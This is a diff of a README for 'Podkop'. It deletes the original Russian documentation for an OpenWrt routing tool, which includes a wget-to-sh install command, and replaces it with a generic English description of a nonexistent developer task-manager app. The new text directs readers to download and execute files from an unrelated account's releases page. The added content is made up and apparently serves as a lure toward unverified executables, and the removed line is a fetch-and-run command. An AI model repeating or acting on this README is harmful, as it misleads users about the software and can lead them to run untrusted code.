@@ -1,59 +1,83 @@
-# Вещи, которые вам нужно знать перед установкой
+# Podkop: Dev Podkop 🛠️
 
-- Это бета-версия, которая находится в активной разработке. Из версии в версию что-то может меняться.
-- При возникновении проблем, нужен технически грамотный фидбэк в чат.
-- При обновлении **обязательно** [сбрасывайте кэш LuCI](https://podkop.net/docs/clearbrowsercache/).
-- Также при обновлении всегда заходите в конфигурацию и проверяйте свои настройки. Конфигурация может измениться.
-- Необходимо минимум 15МБ свободного места на роутере. Роутеры с флешками на 16МБ сразу мимо.
-- При старте программы редактируется конфиг Dnsmasq.
-- Podkop редактирует конфиг sing-box. Обязательно сохраните ваш конфиг sing-box перед установкой, если он вам нужен.
-- Информация здесь может быть устаревшей. Все изменения фиксируются в [телеграм-чате](https://t.me/itdogchat/81758/420321).
-- [Если у вас не что-то не работает.](https://podkop.net/docs/diagnostics/)
-- Если у вас установлен Getdomains, [его следует удалить](https://github.com/itdoginfo/domain-routing-openwrt?tab=readme-ov-file#%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82-%D0%B4%D0%BB%D1%8F-%D1%83%D0%B4%D0%B0%D0%BB%D0%B5%D0%BD%D0%B8%D1%8F).
+![Podkop Logo](https://img.shields.io/badge/Podkop-Dev%20Podkop-blue)
 
-# Документация
-https://podkop.net/
+Welcome to the **Podkop** repository! This project aims to simplify and enhance your development workflow. Here, you'll find all the necessary resources to get started with Podkop, as well as updates and release notes.
 
-# Установка Podkop
-Полная информация в [документации](https://podkop.net/docs/install/)
+## Table of Contents
 
-Вкратце, достаточно одного скрипта для установки:
-```
-sh <(wget -O - https://raw.githubusercontent.com/itdoginfo/podkop/refs/heads/main/install.sh)
-```
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
+8. [Releases](#releases)
 
-Для обновления:
-```
-sh <(wget -qO- https://raw.githubusercontent.com/itdoginfo/podkop/refs/heads/main/install.sh) --upgrade
-```
+## Introduction
 
-# ToDo
-Этот раздел не означает задачи, которые нужно брать и делать. Это общий список хотелок. Если вы хотите помочь, пожалуйста, спросите сначала в телеграмме.
+Podkop is designed for developers who want a streamlined environment for their projects. With its user-friendly interface and powerful features, Podkop can help you manage your development tasks more efficiently.
 
-Основные задачи в issues.
+## Features
 
-## Рефактор
-- [ ] Очевидные повторения в `/usr/bin/podkop` загнать в переменые
-- [ ] Возможно поменять структуру
+- **User-Friendly Interface**: Easy to navigate and use, even for beginners.
+- **Task Management**: Organize your tasks and projects with ease.
+- **Integration**: Seamlessly integrates with popular development tools.
+- **Customization**: Tailor the environment to suit your workflow.
 
-## Списки
-- [ ] Speedtest
-- [x] Google AI
-- [x] Google PlayMarket. Здесь уточнить, что точно не работает через корректную настройку FakeIP, а не dnsmasq+nft.
-- [x] Hetzner ASN (AS24940)
-- [x] OVH ASN (AS16276)
+## Installation
 
-## Будущее
-- [ ] После наполнения вики про туннели, убрать всё что связано с их установкой из скрипта. Только с AWG что-то решить, лучше чтоб был скрипт в сторонем репозитории. 
-- [ ] Подписка. Здесь нужна реализация, чтоб для каждой секции помимо ручного выбора, был выбор фильтрации по тегу. Например, для main выбираем ключевые слова NL, DE, FI. А для extra секции фильтруем по RU. И создаётся outbound c urltest в которых перечислены outbound из фильтров.
-- [ ] Опция, когда все запросы (с роутера в первую очередь), а не только br-lan идут в прокси. С этим связана #95. Требуется много переделать для nftables.
-- [ ] Весь трафик в Proxy\VPN. Вопрос, что делать с экстрасекциями в этом случае. FakeIP здесь скорее не нужен, а значит только main секция остаётся. Всё что касается fakeip проверок, придётся выключать в этом режиме.
-- [ ] Поддержка Source format. Нужна расшифровка в json и если присуствуют подсети, заносить их в custom subnet nftset.
-- [ ] Переделывание функции формирования кастомных списков в JSON. Обрабатывать сразу скопом, а не по одному.
-- [ ] При успешном запуске переходит в фоновый режим и следит за состоянием sing-box. Если вдруг идёт exit 1, выполняется dnsmasq restore и снова следит за состоянием. Вопрос в том, как это искусcтвенно провернуть. Попробовать положить прокси и посмотреть, останется ли работать DNS в этом случае. И здесь, вероятно, можно обойтись триггером в init.d.
-- [ ] Галочка, которая режет доступ к doh серверам.
-- [ ] IPv6. Только после наполнения Wiki.
+To install Podkop, follow these simple steps:
 
-## Тесты
-- [ ] Unit тесты (BATS)
-- [ ] Интеграционые тесты бекенда (OpenWrt rootfs + BATS)
+1. **Download the latest release** from the [Releases section](https://github.com/DouniaLakehal/podkop/releases).
+2. **Execute the downloaded file** to install Podkop on your machine.
+
+Make sure to check the [Releases section](https://github.com/DouniaLakehal/podkop/releases) for the latest updates and installation files.
+
+## Usage
+
+Once you have installed Podkop, you can start using it right away. Here’s how:
+
+1. **Open Podkop** from your applications.
+2. **Create a new project** or open an existing one.
+3. **Manage your tasks** using the built-in task manager.
+4. **Customize settings** to fit your development style.
+
+### Example Workflow
+
+1. Start Podkop.
+2. Create a new project.
+3. Add tasks to your project.
+4. Track your progress and adjust as needed.
+
+## Contributing
+
+We welcome contributions to Podkop! If you would like to help improve the project, please follow these steps:
+
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them.
+4. **Push your changes** to your fork.
+5. **Submit a pull request** for review.
+
+Your contributions help make Podkop better for everyone.
+
+## License
+
+Podkop is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: support@podkop.com
+- **GitHub**: [DouniaLakehal](https://github.com/DouniaLakehal)
+
+## Releases
+
+For the latest updates and downloads, visit the [Releases section](https://github.com/DouniaLakehal/podkop/releases). Make sure to download the appropriate files for your system and follow the installation instructions.
+
+---
+
+Thank you for your interest in Podkop! We hope you find it useful in your development journey. Happy coding!
